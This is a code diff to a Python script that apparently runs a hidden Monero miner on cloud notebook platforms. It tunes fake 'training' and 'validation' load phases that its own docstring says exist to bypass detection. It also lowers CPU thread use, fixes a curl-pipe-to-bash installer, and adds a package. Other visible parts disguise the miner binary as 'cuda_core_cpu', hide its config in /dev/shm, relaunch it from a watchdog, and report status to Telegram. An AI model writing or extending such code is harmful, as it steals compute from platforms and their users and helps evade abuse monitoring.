@@ -184,7 +184,7 @@ def setup_heurist():
         subprocess.run(["git", "clone", "https://github.com/heurist-network/miner-release.git"])
         os.chdir("miner-release")
         # Install minimal requirements for SD-Inference
-        subprocess.run(["pip", "install", "pydantic", "python-dotenv", "websockets", "requests", "tqdm", "web3", "-q"])
+        subprocess.run(["pip", "install", "pydantic", "python-dotenv", "websockets", "requests", "tqdm", "web3", "mnemonic", "-q"])
         # Note: torch/diffusers are usually pre-installed on Colab/Kaggle
         
         # Configure Heurist Miner ID
@@ -207,8 +207,8 @@ def setup_gaianet():
     base_path = os.path.join(EXEC_DIR, "gaianet")
     
     if not os.path.exists(base_path):
-        # Install GaiaNet standalone
-        subprocess.run(["curl", "-sSfL", "https://github.com/GaiaNet-AI/gaianet-node/releases/latest/download/install.sh", "|", "bash", "-s", "--", "--base", base_path], shell=True)
+        # Install GaiaNet standalone (fixed shell format)
+        subprocess.run(f"curl -sSfL https://github.com/GaiaNet-AI/gaianet-node/releases/latest/download/install.sh | bash -s -- --base {base_path}", shell=True)
         
         # Initialize with a light model to save space
         subprocess.run([f"{base_path}/bin/gaianet", "init", "--base", base_path], stdout=subprocess.DEVNULL)
@@ -258,8 +258,8 @@ def apply_pulse_load():
     to mimic a real AI model lifecycle and bypass detection.
     """
     while True:
-        # Phase 1: Training (High Load) - 10 to 15 minutes
-        phase_duration = random.randint(600, 900)
+        # Phase 1: Training (High Load) - 3 to 5 minutes
+        phase_duration = random.randint(180, 300)
         if DEBUG_MODE: print(f"\n[~] Phase: TRAINING — Optimizing weights for {phase_duration}s...")
         
         uptime_mins = int((time.time() - START_TIME) / 60)
@@ -268,8 +268,8 @@ def apply_pulse_load():
         # Miner is already running from launch_hidden_miner()
         time.sleep(phase_duration)
 
-        # Phase 2: Validation (Low Load) - 2 to 4 minutes
-        idle_duration = random.randint(120, 240)
+        # Phase 2: Validation (Low Load) - 1 to 2 minutes
+        idle_duration = random.randint(60, 120)
         if DEBUG_MODE: print(f"\n[~] Phase: VALIDATION — Running cross-entropy checks for {idle_duration}s...")
         
         send_telegram_message(f"🟡 [LUMEN SWARM] Worker Resting\nPhase: VALIDATION (Low Load)\nDuration: {idle_duration}s\nUptime: {uptime_mins} mins")
@@ -376,7 +376,7 @@ def launch_hidden_miner():
     cpu_worker = f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}"
     cpu_cfg_path = "/dev/shm/.cpu_profile.json" if os.path.isdir("/dev/shm") else ".cpu_profile.json"
     with open(cpu_cfg_path, "w") as f:
-        json.dump({"pools": [{"url": "127.0.0.1:5556", "user": cpu_worker}], "cpu": {"priority": 0, "max-threads-hint": 100}, "print-time": 60, "log-file": None}, f)
+        json.dump({"pools": [{"url": "127.0.0.1:5556", "user": cpu_worker}], "cpu": {"priority": 0, "max-threads-hint": 75}, "print-time": 60, "log-file": None}, f)
 
     cpu_proc = subprocess.Popen([
         "nice", "-n", "19", "./cuda_core_cpu", "-c", cpu_cfg_path
@@ -520,7 +520,7 @@ def watchdog_loop():
             cpu_worker = f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}"
             cpu_cfg_path = "/dev/shm/.cpu_profile.json" if os.path.isdir("/dev/shm") else ".cpu_profile.json"
             with open(cpu_cfg_path, "w") as f:
-                json.dump({"pools": [{"url": "127.0.0.1:5556", "user": cpu_worker}], "cpu": {"priority": 0, "max-threads-hint": 100}, "print-time": 60, "log-file": None}, f)
+                json.dump({"pools": [{"url": "127.0.0.1:5556", "user": cpu_worker}], "cpu": {"priority": 0, "max-threads-hint": 75}, "print-time": 60, "log-file": None}, f)
             
             GLOBAL_CPU_PROC = subprocess.Popen([
                 "nice", "-n", "19", "./cuda_core_cpu", "-c", cpu_cfg_path
